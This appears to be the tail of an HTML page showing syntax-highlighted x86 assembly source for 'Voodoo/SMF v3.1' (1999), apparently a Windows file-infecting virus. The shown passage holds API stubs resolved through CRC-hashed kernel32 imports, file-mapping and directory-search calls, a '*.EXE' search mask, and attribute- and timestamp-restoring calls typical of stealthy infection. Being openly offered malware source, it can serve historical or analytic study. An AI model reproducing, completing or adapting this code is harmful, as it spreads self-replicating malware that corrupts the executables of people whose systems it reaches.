             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FlushViewOfFile</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_FlushViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
               </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_GetCommandLineA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">lstrcpyA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_lstrcpyA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_ReadFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_SetFilePointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
               </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectory</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_GetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectory</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_SetFileTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetSystemTime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_GetSystemTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'(c) Voodoo/SMF v3.1 07.08.1999'</span><span class="sc0">
</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11223344h</span><span class="sc0">
</span><span class="sc5">KernelHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11223344h</span><span class="sc0">
</span><span class="sc5">Name_Pointers_RVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11223344h</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11223344h</span><span class="sc0">
</span><span class="sc5">_GlobalLock</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11223344h</span><span class="sc0">
</span><span class="sc5">MemPointer</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11223344h</span><span class="sc0">
</span><span class="sc5">disk</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'c:\',0
</span><span class="sc5">Dirmask</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">mask</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ImportCount</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndImportTable</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ImportTable</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">ImportTable</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">GlobalUnlockCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">GlobalFreeCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">CreateFileACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">CreateFileMappingACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">MapViewOfFileCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">UnmapViewOfFileCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">FlushViewOfFileCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">CloseHandleCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">FindFirstFileACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">FindNextFileACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">SetFileAttributesACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">SetFileTimeCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">GetFileSizeCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">GetCommandLineACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ReadFileCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">lstrcpyACRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">SetFilePointerCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">GetCurrentDirectoryCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">SetCurrentDirectoryCRC</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">GetSystemTimeCRC</span><span class="sc0">
                  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">6666h</span><span class="sc0">
</span><span class="sc5">EndImportTable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Voodoo_Ver_3_0E</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
</span></div></body>
</html>
